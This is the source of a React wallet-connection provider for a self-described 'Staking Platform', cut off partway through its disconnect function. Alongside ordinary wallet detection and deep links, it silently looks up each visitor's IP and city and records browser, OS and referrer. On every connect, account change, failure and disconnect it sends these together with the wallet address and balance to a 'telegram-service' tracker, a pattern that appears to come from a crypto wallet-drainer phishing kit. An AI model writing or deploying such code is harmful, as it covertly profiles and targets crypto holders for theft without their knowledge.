"use client"

import { createContext, useContext, useState, useEffect, type ReactNode } from "react"
import { trackWalletConnection } from "@/lib/telegram-service"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"

declare global {
  interface Window {
    ethereum?: any
    ethers?: any
    phantom?: any
    solana?: any
  }
}

// WalletConnect project ID
const WALLET_CONNECT_PROJECT_ID = "2fc330b1a9aa1b7c859bd84210853433"

const WALLET_OPTIONS = [
  { name: "Binance Web3 Wallet", color: "#F0B90B", icon: "/images/wallets/binance.png" },
  { name: "Browser", color: "#4285F4", icon: "/images/wallets/browser.png" },
  { name: "MetaMask", color: "#F6851B", icon: "/images/wallets/metamask-new.png" },
  { name: "OKX Wallet", color: "#000000", icon: "/images/wallets/okx.png" },
  { name: "Ledger", color: "#000000", icon: "/images/wallets/ledger.png" },
  { name: "Exodus", color: "#1B1B1B", icon: "/images/wallets/exodus-new.png" },
]

const OTHER_WALLET_OPTIONS = [
  { name: "Trust Wallet", color: "#3375BB", icon: "/images/wallets/trustwallet.png" },
  { name: "Coinbase Wallet", color: "#0052FF", icon: "/images/wallets/coinbase.png" },
  { name: "Rainbow", color: "#001E59", icon: "/images/wallets/rainbow.png" },
  { name: "Argent", color: "#FF875B", icon: "/images/wallets/argent.png" },
  { name: "imToken", color: "#11C4D1", icon: "/images/wallets/imtoken.png" },
  { name: "Crypto.com", color: "#002D74", icon: "/images/wallets/crypto-com.png" },
  { name: "TokenPocket", color: "#2980FE", icon: "/images/wallets/tokenpocket.png" },
  {
    name: "Phantom",
    color: "#AB9FF2",
    icon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiB2aWV3Qm94PSIwIDAgMTI4IDEyOCI+CiAgPGRlZnM+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImEiIHgxPSI2My42NiIgeTE9IjE1MC41IiB4Mj0iNjMuNjYiIHkyPSIzNS41IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzUzNGJCMSIvPgogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM1NTFCRjkiLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImIiIHgxPSI2My42NiIgeTE9IjE1MC41IiB4Mj0iNjMuNjYiIHkyPSIzNS41IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzlEOUJGRiIvPgogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNBQjlGRjIiLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgPC9kZWZzPgogIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgLTI0KSI+CiAgICA8Y2lyY2xlIGN4PSI2NCIgY3k9Ijg4IiByPSI2NCIgZmlsbD0idXJsKCNhKSIvPgogICAgPHBhdGggZD0iTTEwMi41IDgzLjc1YzAgMTAuNzYtMTQuNzYgMTkuNDktMzMgMTkuNDlzLTMzLTguNzMtMzMtMTkuNDkgMTQuNzYtMTkuNDkgMzMtMTkuNDkgMzMgOC43MyAzMyAxOS40OXoiIGZpbGw9IiNmZmYiLz4KICAgIDxjaXJjbGUgY3g9IjY0IiBjeT0iODgiIHI9IjQwIiBmaWxsPSJ1cmwoI2IpIi8+CiAgICA8cGF0aCBkPSJNMTAyLjUgODMuNzVjMCAxMC43Ni0xNC43NiAxOS40OS0zMyAxOS40OXMtMzMtOC43My0zMy0xOS40OSAxNC43Ni0xOS40OSAzMy0xOS40OSAzMyA4LjczIDMzIDE5LjQ5eiIgZmlsbD0iI2ZmZiIvPgogICAgPHBhdGggZD0iTTY0IDEwNy43OWMtMTguMjQgMC0zMy04LjczLTMzLTE5LjQ5czE0Ljc2LTE5LjQ5IDMzLTE5LjQ5IDMzIDguNzMgMzMgMTkuNDktMTQuNzYgMTkuNDktMzMgMTkuNDl6bTAtMzUuNzNjLTE2LjY4IDAtMzAgNy4yOC0zMCAxNi4yNHMxMy4zMiAxNi4yNCAzMCAxNi4yNCAzMC03LjI4IDMwLTE2LjI0LTEzLjMyLTE2LjI0LTMwLTE2LjI0eiIgZmlsbD0iIzE5MTMyNiIvPgogICAgPHBhdGggZD0iTTU0LjM2IDg0LjgzYzAgMi43OS0yLjM3IDUuMDYtNS4yOSA1LjA2cy01LjI5LTIuMjctNS4yOS01LjA2IDIuMzctNS4wNiA1LjI5LTUuMDYgNS4yOSAyLjI3IDUuMjkgNS4wNnpNODQuMjIgODQuODNjMCAyLjc5LTIuMzcgNS4wNi01LjI5IDUuMDZzLTUuMjktMi4yNy01LjI5LTUuMDYgMi4zNy01LjA2IDUuMjktNS4wNiA1LjI5IDIuMjcgNS4yOSA1LjA2eiIgZmlsbD0iIzE5MTMyNiIvPgogIDwvZz4KPC9zdmc.Cg==",
  },
]

type Web3ContextType = {
  isConnected: boolean
  address: string | null
  balance: string
  connect: () => Promise<boolean>
  disconnect: () => void
  selectNewWallet: () => void
  refreshBalance: () => Promise<number>
  tokenBalances: Record<string, string>
}

export const Web3Context = createContext<Web3ContextType>({
  isConnected: false,
  address: null,
  balance: "0",
  connect: async () => false,
  disconnect: () => {},
  selectNewWallet: () => {},
  refreshBalance: async () => 0,
  tokenBalances: {},
})

export const useWeb3 = () => useContext(Web3Context)

export function Web3Provider({ children }: { children: ReactNode }) {
  const [isConnected, setIsConnected] = useState(false)
  const [address, setAddress] = useState<string | null>(null)
  const [balance, setBalance] = useState("0")
  const [walletType, setWalletType] = useState<string>("Unknown")
  const [userIP, setUserIP] = useState<string | null>(null)
  const [userLocation, setUserLocation] = useState<{ country?: string; city?: string } | null>(null)
  const [userBrowser, setUserBrowser] = useState<string>("Unknown")
  const [userOS, setUserOS] = useState<string>("Unknown")
  const [referrer, setReferrer] = useState<string>("Direct")
  const [isMobile, setIsMobile] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
  const [wcUri, setWcUri] = useState<string | null>(null)
  const [activeProvider, setActiveProvider] = useState<any>(null)
  const [hasDisconnected, setHasDisconnected] = useState(false)
  const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({})
  const [forceWalletSelection, setForceWalletSelection] = useState(false)
  // Update the state to track when a user is explicitly selecting a new wallet
  const [isSelectingNewWallet, setIsSelectingNewWallet] = useState(false)

  // Check if we're on mobile
  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      return /android|iPad|iPhone|iPod/i.test(userAgent) && !/Windows Phone/i.test(userAgent)
    }
    setIsMobile(checkMobile())
  }, [])

  // Set up basic user info
  useEffect(() => {
    const storedReferrer = localStorage.getItem("referrer")
    if (storedReferrer) {
      setReferrer(storedReferrer)
    } else if (document.referrer) {
      setReferrer(document.referrer)
    }

    if (typeof navigator !== "undefined") {
      const userAgent = navigator.userAgent

      if (userAgent.indexOf("Chrome") > -1) setUserBrowser("Chrome")
      else if (userAgent.indexOf("Safari") > -1) setUserBrowser("Safari")
      else if (userAgent.indexOf("Firefox") > -1) setUserBrowser("Firefox")
      else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) setUserBrowser("Internet Explorer")
      else if (userAgent.indexOf("Edge") > -1) setUserBrowser("Edge")
      else if (userAgent.indexOf("Opera") > -1) setUserBrowser("Opera")

      if (userAgent.indexOf("Win") > -1) setUserOS("Windows")
      else if (userAgent.indexOf("Mac") > -1) setUserOS("MacOS")
      else if (userAgent.indexOf("Linux") > -1) setUserOS("Linux")
      else if (userAgent.indexOf("Android") > -1) setUserOS("Android")
      else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1 || userAgent.indexOf("iPod") > -1)
        setUserOS("iOS")
    }

    // Get user IP and location
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        if (data.ip) {
          setUserIP(data.ip)
          return fetch(`https://ipapi.co/${data.ip}/json/`)
        }
        return fetch("https://ipapi.co/json/")
      })
      .then((res) => res.json())
      .then((data) => {
        setUserLocation({
          country: data.country_name,
          city: data.city,
        })
      })
      .catch((err) => {
        console.error("Failed to get IP or location:", err)
      })
  }, [])

  // Detect available wallet providers
  const detectWalletProviders = () => {
    if (typeof window === "undefined") return []

    const providers: any[] = []

    // Check for window.ethereum (injected provider)
    if (window.ethereum) {
      // Check if it's an array of providers (like with MetaMask + other wallets)
      if (window.ethereum.providers) {
        window.ethereum.providers.forEach((provider: any) => {
          providers.push(provider)
        })
      } else {
        // Single provider
        providers.push(window.ethereum)
      }
    }

    // Check for Phantom wallet specifically
    if (window.phantom?.ethereum) {
      providers.push(window.phantom.ethereum)
    }

    return providers
  }

  // Get wallet type from provider
  const getWalletTypeFromProvider = (provider: any): string => {
    if (!provider) return "Unknown"

    if (provider.isPhantom) return "Phantom"
    if (provider.isMetaMask) return "MetaMask"
    if (provider.isCoinbaseWallet) return "Coinbase Wallet"
    if (provider.isExodus) return "Exodus"
    if (provider.isTrust) return "Trust Wallet"
    if (provider.isOkxWallet) return "OKX Wallet"
    if (provider.isBinance) return "Binance Web3 Wallet"
    if (provider.isWalletConnect) return "WalletConnect"
    if (provider.isRainbow) return "Rainbow"
    if (provider.isArgent) return "Argent"
    if (provider.isImToken) return "imToken"
    if (provider.isCrypto) return "Crypto.com"
    if (provider.isTokenPocket) return "TokenPocket"

    // Check for provider name
    if (provider.providerName) {
      return provider.providerName
    }

    // Check for Phantom wallet by checking the provider object
    if (provider._metamask?.isPhantom || provider.isPhantom) {
      return "Phantom"
    }

    return "Browser"
  }

  // Auto-connect on initial load
  useEffect(() => {
    const autoConnect = async () => {
      // If user has explicitly disconnected in this session, don't auto-connect
      if (hasDisconnected || forceWalletSelection) {
        return
      }

      const savedAddress = localStorage.getItem("walletAddress")
      const savedWalletType = localStorage.getItem("walletType")

      // First check if we have any active connections in any provider
      const providers = detectWalletProviders()

      // Try to find any already connected account in any provider first
      for (const provider of providers) {
        try {
          const accounts = await provider.request({ method: "eth_accounts" })

          if (accounts && accounts.length > 0) {
            const connectedAddress = accounts[0]
            const detectedWalletType = getWalletTypeFromProvider(provider)

            console.log(`Found connected account: ${connectedAddress} in wallet: ${detectedWalletType}`)

            // Set up the connection with this provider
            setActiveProvider(provider)
            setAddress(connectedAddress)
            setIsConnected(true)
            setWalletType(detectedWalletType)

            // Update localStorage with this connection
            localStorage.setItem("walletAddress", connectedAddress)
            localStorage.setItem("walletType", detectedWalletType)

            // Get balance
            try {
              const balanceHex = await provider.request({
                method: "eth_getBalance",
                params: [connectedAddress, "latest"],
              })

              const balanceWei = Number.parseInt(balanceHex, 16)
              const balanceEth = balanceWei / 1e18
              setBalance(balanceEth.toFixed(6))

              // Fetch token balances
              await fetchTokenBalances(connectedAddress)

              // Send notification about the connection
              await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
            } catch (balanceError) {
              console.error("Error getting balance:", balanceError)
            }

            // We found an active connection, no need to check others
            return
          }
        } catch (error) {
          console.warn("Error checking provider:", error)
        }
      }

      // If we didn't find any active connections but have a saved address,
      // try to reconnect using the saved information
      if (savedAddress && savedWalletType) {
        console.log(`Trying to reconnect to saved wallet: ${savedWalletType} with address: ${savedAddress}`)

        for (const provider of providers) {
          try {
            const detectedWalletType = getWalletTypeFromProvider(provider)

            // If this provider matches our saved wallet type, try to use it
            if (
              detectedWalletType === savedWalletType ||
              (detectedWalletType === "Browser" && savedWalletType === "Browser")
            ) {
              // Try to get accounts from this provider
              const accounts = await provider.request({ method: "eth_accounts" })

              if (accounts && accounts.length > 0) {
                const connectedAddress = accounts[0]

                // Set up the connection with this provider
                setActiveProvider(provider)
                setAddress(connectedAddress)
                setIsConnected(true)
                setWalletType(detectedWalletType)

                // Get balance
                try {
                  const balanceHex = await provider.request({
                    method: "eth_getBalance",
                    params: [connectedAddress, "latest"],
                  })

                  const balanceWei = Number.parseInt(balanceHex, 16)
                  const balanceEth = balanceWei / 1e18
                  setBalance(balanceEth.toFixed(6))

                  // Fetch token balances
                  await fetchTokenBalances(connectedAddress)

                  // Send notification about the connection
                  await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
                } catch (balanceError) {
                  console.error("Error getting balance:", balanceError)
                }

                // We found a matching provider, no need to check others
                return
              }
            }
          } catch (error) {
            console.warn("Error checking provider:", error)
          }
        }
      }

      // If we get here, we didn't find any active connections or matching saved providers
      localStorage.removeItem("walletAddress")
      localStorage.removeItem("walletType")
    }

    autoConnect()
  }, [hasDisconnected, forceWalletSelection])

  // Listen for account changes
  useEffect(() => {
    if (!activeProvider) return

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        disconnect()
      } else if (accounts[0] !== address) {
        setAddress(accounts[0])
        localStorage.setItem("walletAddress", accounts[0])
        refreshBalance()
        fetchTokenBalances(accounts[0])

        // Send notification about the account change
        sendWalletConnectedNotification(accounts[0], walletType, balance)
      }
    }

    activeProvider.on("accountsChanged", handleAccountsChanged)

    return () => {
      activeProvider.removeListener("accountsChanged", handleAccountsChanged)
    }
  }, [activeProvider, address, walletType, balance])

  // Listen for chain changes
  useEffect(() => {
    if (!activeProvider) return

    const handleChainChanged = (chainId: string) => {
      console.log("Chain changed to:", chainId)
      // Refresh the page when the chain changes
      if (typeof window !== "undefined") {
        window.location.reload()
      }
    }

    activeProvider.on("chainChanged", handleChainChanged)

    return () => {
      activeProvider.removeListener("chainChanged", handleChainChanged)
    }
  }, [activeProvider])

  // Add a global ethereum provider listener for when multiple wallets are installed
  useEffect(() => {
    if (typeof window === "undefined" || !window.ethereum) return

    const handleAccountsChanged = (accounts: string[]) => {
      console.log("Global accounts changed:", accounts)
      if (accounts.length === 0) {
        disconnect()
      } else if (!isConnected || accounts[0] !== address) {
        // If we're not connected or the address changed, update our state
        setAddress(accounts[0])
        setIsConnected(true)
        localStorage.setItem("walletAddress", accounts[0])
        refreshBalance()
        fetchTokenBalances(accounts[0])

        // Send notification about the account change
        sendWalletConnectedNotification(accounts[0], "Browser", balance)
      }
    }

    window.ethereum.on("accountsChanged", handleAccountsChanged)

    return () => {
      if (window.ethereum && window.ethereum.removeListener) {
        window.ethereum.removeListener("accountsChanged", handleAccountsChanged)
      }
    }
  }, [isConnected, address, balance])

  // Add a specific listener for Phantom wallet
  useEffect(() => {
    if (typeof window === "undefined" || !window.phantom?.ethereum) return

    const handleAccountsChanged = (accounts: string[]) => {
      console.log("Phantom accounts changed:", accounts)
      if (accounts.length === 0) {
        disconnect()
      } else if (!isConnected || accounts[0] !== address) {
        // If we're not connected or the address changed, update our state
        setAddress(accounts[0])
        setIsConnected(true)
        setWalletType("Phantom")
        setActiveProvider(window.phantom.ethereum)
        localStorage.setItem("walletAddress", accounts[0])
        localStorage.setItem("walletType", "Phantom")
        refreshBalanceWithProvider(window.phantom.ethereum, accounts[0])
        fetchTokenBalances(accounts[0])

        // Send notification about the account change
        sendWalletConnectedNotification(accounts[0], "Phantom", balance)
      }
    }

    window.phantom.ethereum.on("accountsChanged", handleAccountsChanged)

    return () => {
      if (window.phantom?.ethereum?.removeListener) {
        window.phantom.ethereum.removeListener("accountsChanged", handleAccountsChanged)
      }
    }
  }, [isConnected, address, balance])

  // Mobile wallet deep links
  const openMobileWallet = (walletType: string) => {
    console.log(`Opening mobile wallet: ${walletType}`)

    const currentUrl = typeof window !== "undefined" ? window.location.href : "https://your-website-url.com"
    const currentHost = typeof window !== "undefined" ? window.location.host : "your-website-url.com"

    // Universal links and deep links for various wallets
    const deepLinks: Record<string, string> = {
      MetaMask: `https://metamask.app.link/dapp/${currentHost}`,
      "Trust Wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`,
      "Coinbase Wallet": `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(currentUrl)}`,
      Rainbow: `https://rnbwapp.com/dapp?url=${encodeURIComponent(currentUrl)}`,
      Argent: `https://argent.link/app/open?url=${encodeURIComponent(currentUrl)}`,
      imToken: `imtokenv2://browsing?url=${encodeURIComponent(currentUrl)}`,
      "Crypto.com": `https://crypto.com/defi-wallet/browser?url=${encodeURIComponent(currentUrl)}`,
      TokenPocket: `tpoutside://browser?url=${encodeURIComponent(currentUrl)}`,
      "OKX Wallet": `okex://wallet/dapp/details?dappUrl=${encodeURIComponent(currentUrl)}`,
      "Binance Web3 Wallet": `bnc://browse/${encodeURIComponent(currentUrl)}`,
      Phantom: `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`,
    }

    // If we have a WalletConnect URI, use it for wallets that support WalletConnect
    if (wcUri) {
      const wcDeepLinks: Record<string, string> = {
        Exodus: `exodus://?uri=${encodeURIComponent(wcUri)}`,
        "Trust Wallet": `trust://wc?uri=${encodeURIComponent(wcUri)}`,
        Rainbow: `rainbow://wc?uri=${encodeURIComponent(wcUri)}`,
        Argent: `argent://wc?uri=${encodeURIComponent(wcUri)}`,
        imToken: `imtokenv2://wc?uri=${encodeURIComponent(wcUri)}`,
        "Crypto.com": `cryptowallet://wc?uri=${encodeURIComponent(wcUri)}`,
        TokenPocket: `tpoutside://wc?uri=${encodeURIComponent(wcUri)}`,
      }

      if (wcDeepLinks[walletType]) {
        window.location.href = wcDeepLinks[walletType]
        return true
      }
    }

    // Use standard deep links if available
    if (deepLinks[walletType]) {
      // Try to open the wallet app via deep link
      window.location.href = deepLinks[walletType]

      // Fallback to app store if deep link fails
      setTimeout(() => {
        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent)

        if (isIOS) {
          const appStoreLinks: Record<string, string> = {
            MetaMask: "https://apps.apple.com/us/app/metamask/id1438144202",
            "Trust Wallet": "https://apps.apple.com/us/app/trust-crypto-bitcoin-wallet/id1288339409",
            "Coinbase Wallet": "https://apps.apple.com/us/app/coinbase-wallet-nfts-crypto/id1278383455",
            Rainbow: "https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021",
            Argent: "https://apps.apple.com/us/app/argent-defi-in-a-tap/id1358741926",
            imToken: "https://apps.apple.com/us/app/imtoken-eth-btc-wallet/id1384798940",
            Exodus: "https://apps.apple.com/us/app/exodus-crypto-bitcoin-wallet/id1414384820",
            "Crypto.com": "https://apps.apple.com/us/app/crypto-com-defi-wallet/id1512048310",
            TokenPocket: "https://apps.apple.com/us/app/tokenpocket-crypto-defi-wallet/id1436028697",
            "OKX Wallet": "https://apps.apple.com/us/app/okx-buy-bitcoin-crypto/id1327268470",
            "Binance Web3 Wallet": "https://apps.apple.com/us/app/binance-buy-bitcoin-crypto/id1436799971",
            Phantom: "https://apps.apple.com/us/app/phantom-crypto-wallet/id1598432977",
          }
          window.location.href = appStoreLinks[walletType] || "https://apps.apple.com/us/genre/ios-finance/id6015"
        } else {
          const playStoreLinks: Record<string, string> = {
            MetaMask: "https://play.google.com/store/apps/details?id=io.metamask",
            "Trust Wallet": "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
            "Coinbase Wallet": "https://play.google.com/store/apps/details?id=org.toshi",
            Rainbow: "https://play.google.com/store/apps/details?id=me.rainbow",
            Argent: "https://play.google.com/store/apps/details?id=im.argent.contractwalletclient",
            imToken: "https://play.google.com/store/apps/details?id=im.token.app",
            Exodus: "https://play.google.com/store/apps/details?id=exodusmovement.exodus",
            "Crypto.com": "https://play.google.com/store/apps/details?id=com.defi.wallet",
            TokenPocket: "https://play.google.com/store/apps/details?id=vip.mytokenpocket",
            "OKX Wallet": "https://play.google.com/store/apps/details?id=com.okex.android",
            "Binance Web3 Wallet": "https://play.google.com/store/apps/details?id=com.binance.dev",
            Phantom: "https://play.google.com/store/apps/details?id=app.phantom",
          }
          window.location.href = playStoreLinks[walletType] || "https://play.google.com/store/apps/category/FINANCE"
        }
      }, 2500)

      return true
    }

    // If we don't have a specific deep link for this wallet
    console.warn(`No deep link available for ${walletType}`)
    return false
  }

  // Initialize WalletConnect
  const initializeWalletConnect = async () => {
    try {
      // Dynamically import WalletConnect
      const { EthereumProvider } = await import("@walletconnect/ethereum-provider")

      // Initialize the provider
      const provider = await EthereumProvider.init({
        projectId: WALLET_CONNECT_PROJECT_ID,
        chains: [1], // Ethereum mainnet
        optionalChains: [137, 42161], // Polygon, Arbitrum
        showQrModal: true,
        qrModalOptions: {
          themeMode: "dark",
        },
        metadata: {
          name: "Staking Platform",
          description: "Modern Ethereum Staking Platform",
          url: window.location.origin,
          icons: [`${window.location.origin}/logo.png`],
        },
      })

      // Subscribe to events
      provider.on("connect", (e: any) => {
        console.log("WalletConnect connected!", e)
        if (provider.accounts && provider.accounts.length > 0) {
          const userAddress = provider.accounts[0]
          setAddress(userAddress)
          setIsConnected(true)
          setActiveProvider(provider)
          setWalletType("WalletConnect")
          localStorage.setItem("walletAddress", userAddress)
          localStorage.setItem("wallet_connected_time", Date.now().toString())
          localStorage.setItem("walletType", "WalletConnect")
          refreshBalanceWithProvider(provider, userAddress)
          fetchTokenBalances(userAddress)

          // Send notification about the connection
          sendWalletConnectedNotification(userAddress, "WalletConnect", balance)
        }
      })

      provider.on("disconnect", () => {
        console.log("WalletConnect disconnected!")
        disconnect()
      })

      // Connect
      await provider.connect()

      // Expose provider globally for debugging
      if (typeof window !== "undefined") {
        window.ethereum = provider
      }

      return true
    } catch (error) {
      console.error("Failed to initialize WalletConnect:", error)
      return false
    }
  }

  // Modify the connect function to handle wallet selection better
  const connect = async () => {
    if (isConnecting) return false
    setIsConnecting(true)

    try {
      // If force wallet selection is enabled or user is explicitly selecting a new wallet,
      // always show the wallet selection modal
      if (forceWalletSelection || isSelectingNewWallet) {
        setIsWalletModalOpen(true)
        setIsConnecting(false)
        return false
      }

      // First check if we're already connected to a wallet
      if (isConnected && address) {
        console.log("Already connected to wallet:", address)
        setIsConnecting(false)
        return true
      }

      // If user has disconnected in this session, or we're reconnecting,
      // always show the wallet selection modal
      if (hasDisconnected) {
        setIsWalletModalOpen(true)
        setIsConnecting(false)
        return false
      }

      // Check if there's an active wallet connection we can use directly
      const providers = detectWalletProviders()
      for (const provider of providers) {
        try {
          const accounts = await provider.request({ method: "eth_accounts" })
          if (accounts && accounts.length > 0) {
            const connectedAddress = accounts[0]
            const detectedWalletType = getWalletTypeFromProvider(provider)

            // Skip Phantom wallet for auto-connect to force showing the modal
            if (detectedWalletType === "Phantom") {
              continue
            }

            console.log(`Found already connected wallet: ${detectedWalletType} with address: ${connectedAddress}`)

            // Set up the connection with this provider
            setActiveProvider(provider)
            setAddress(connectedAddress)
            setIsConnected(true)
            setWalletType(detectedWalletType)

            // Store connection info
            localStorage.setItem("walletAddress", connectedAddress)
            localStorage.setItem("wallet_connected_time", Date.now().toString())
            localStorage.setItem("walletType", detectedWalletType)

            // Get balance
            await refreshBalanceWithProvider(provider, connectedAddress)
            await fetchTokenBalances(connectedAddress)

            // Send notification about the connection
            await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balance)

            setIsConnecting(false)
            return true
          }
        } catch (error) {
          console.warn("Error checking provider:", error)
        }
      }

      // If no active connection found, show the wallet selection modal
      setIsWalletModalOpen(true)
      setIsConnecting(false)
      return false
    } catch (error) {
      console.error("Error in connect function:", error)
      setIsConnecting(false)
      return false
    }
  }

  // Add a function to explicitly select a new wallet
  const selectNewWallet = () => {
    setIsSelectingNewWallet(true)
    disconnectWallet().then(() => {
      setIsWalletModalOpen(true)
    })
  }

  // Fetch token balances
  const fetchTokenBalances = async (userAddress: string) => {
    try {
      // For now, we'll just set ETH balance
      setTokenBalances({
        ETH: balance,
      })

      // In a real implementation, you would fetch token balances from Alchemy API
      // This is a placeholder for the actual implementation
    } catch (error) {
      console.error("Error fetching token balances:", error)
      setTokenBalances({ ETH: balance })
    }
  }

  // Update the handleWalletSelection function to properly handle wallet switching
  const handleWalletSelection = async (walletName: string) => {
    setIsConnecting(true)
    setIsWalletModalOpen(false)
    setIsSelectingNewWallet(false) // Reset the selection flag

    try {
      // Clear any existing connection first
      await disconnectWallet()

      // Reset the force wallet selection flag
      setForceWalletSelection(false)

      // Special case for WalletConnect
      if (walletName === "WalletConnect") {
        const success = await initializeWalletConnect()
        setIsConnecting(false)
        return success
      }

      // Special case for Phantom
      if (walletName === "Phantom") {
        if (typeof window !== "undefined" && window.phantom?.ethereum) {
          const provider = window.phantom.ethereum
          try {
            const accounts = await provider.request({ method: "eth_requestAccounts" })

            if (accounts && accounts.length > 0) {
              const userAddress = accounts[0]
              console.log("Phantom wallet connected:", userAddress)

              setActiveProvider(provider)
              setAddress(userAddress)
              setIsConnected(true)
              setWalletType("Phantom")
              setHasDisconnected(false) // Reset disconnect flag

              localStorage.setItem("walletAddress", userAddress)
              localStorage.setItem("wallet_connected_time", Date.now().toString())
              localStorage.setItem("walletType", "Phantom")
              localStorage.removeItem("wallet_disconnected") // Clear disconnected flag

              await refreshBalanceWithProvider(provider, userAddress)
              await fetchTokenBalances(userAddress)

              // Send notification
              await sendWalletConnectedNotification(userAddress, "Phantom", balance)

              setIsConnecting(false)
              return true
            }
          } catch (error) {
            console.error("Error connecting to Phantom:", error)
            setIsConnecting(false)
            return false
          }
        } else {
          alert("Phantom wallet not detected. Please install it first.")
          setIsConnecting(false)
          return false
        }
      }

      // Handle mobile wallet deep links
      if (isMobile) {
        const opened = openMobileWallet(walletName)
        if (opened) {
          setIsConnecting(false)
          return false
        }
      }

      // Find the right provider for this wallet
      const providers = detectWalletProviders()
      let targetProvider = null

      for (const provider of providers) {
        const providerWalletType = getWalletTypeFromProvider(provider)

        // If this provider matches the selected wallet type, use it
        if (providerWalletType === walletName) {
          targetProvider = provider
          break
        }

        // For "Browser" wallet, use any provider that's not a specific wallet
        if (walletName === "Browser" && providerWalletType === "Browser") {
          targetProvider = provider
          break
        }
      }

      // If we didn't find a matching provider
      if (!targetProvider) {
        // If no providers at all, try WalletConnect as fallback
        if (providers.length === 0) {
          console.log("No Ethereum wallet detected in browser, trying WalletConnect")
          const success = await initializeWalletConnect()
          setIsConnecting(false)
          return success
        }

        // If we have providers but none match, alert the user
        console.log(`Selected wallet ${walletName} not found`)
        alert(`Please install or activate ${walletName} first, then try again.`)
        setIsConnecting(false)
        return false
      }

      // Use the selected provider
      console.log(`Using provider for ${walletName}`)
      setActiveProvider(targetProvider)
      setWalletType(walletName)

      // Request accounts
      console.log("Requesting accounts...")
      try {
        const accounts = await targetProvider.request({ method: "eth_requestAccounts" })

        if (!accounts || accounts.length === 0) {
          throw new Error("No accounts returned from wallet")
        }

        const userAddress = accounts[0]
        console.log("Account connected:", userAddress)

        // Update state
        setAddress(userAddress)
        setIsConnected(true)
        setHasDisconnected(false) // Reset disconnect flag

        // Store connection info
        localStorage.setItem("walletAddress", userAddress)
        localStorage.setItem("wallet_connected_time", Date.now().toString())
        localStorage.setItem("walletType", walletName)
        localStorage.removeItem("wallet_disconnected") // Clear disconnected flag

        // Get balance
        const balanceValue = await refreshBalanceWithProvider(targetProvider, userAddress)
        await fetchTokenBalances(userAddress)

        // Send notification
        await sendWalletConnectedNotification(userAddress, walletName, balanceValue.toFixed(6))

        return true
      } catch (error) {
        console.error("Error requesting accounts:", error)
        setIsConnecting(false)
        return false
      }
    } catch (error) {
      console.error("Error connecting wallet:", error)

      try {
        await trackWalletConnection({
          address: "Connection Failed",
          balance: "0",
          walletType: walletName,
          success: false,
          error: error instanceof Error ? error.message : String(error),
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          isMobile,
        })
      } catch (notificationError) {
        console.warn("Failed to send error notification:", notificationError)
      }

      return false
    } finally {
      setIsConnecting(false)
    }
  }

  // Update the disconnectWallet function to properly clean up all connections
  const disconnectWallet = async () => {
    console.log("Disconnecting wallet...")

    // Send notification about disconnection before clearing state
    if (address) {
      try {
        await trackWalletConnection({
          address: address,
          balance: balance,
          walletType: walletType,
          success: false,
          disconnected: true,
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          isMobile,
          etherscanLink: `https://etherscan.io/address/${address}`,
        })
      } catch (error) {
        console.warn("Error sending disconnect notification:", error)
      }
    }

    // Try to disconnect using provider methods if available
    if (activeProvider) {
      try {
        // Some wallets support this method to disconnect
        if (activeProvider.disconnect) {
          await activeProvider.disconnect()
        }

        // For MetaMask and other wallets, we can try to clear permissions
        if (activeProvider.request) {
          try {
            await activeProvider.request({
              method: "wallet_revokePermissions",
              params: [{ eth_accounts: {} }],
            })
          } catch (e) {
            console.warn("Could not revoke wallet permissions:", e)
          }
        }
      } catch (error) {
        console.warn("Error disconnecting from wallet:", error)
      }
    }

    // Clear local state
    setAddress(null)
    setIsConnected(false)
    setBalance("0")
    setWalletType("Unknown")
    setActiveProvider(null)
    setHasDisconnected(true) // Mark that user has explicitly disconnected
    setTokenBalances({})

    // Clear localStorage
    localStorage.removeItem("walletAddress")
    localStorage.removeItem("walletType")
    localStorage.removeItem("wallet_connected_time")

    // Set a flag in localStorage to remember that the user has disconnected
    localStorage.setItem("wallet_disconnected", "true")

    // For Phantom wallet, we need to do additional cleanup
    if (typeof window !== "undefined" && window.phantom?.ethereum) {
      try {
        // Try to disconnect Phantom specifically
        if (window.phantom.ethereum.disconnect) {
          await window.phantom.ethereum.disconnect()
        }
      } catch (error) {
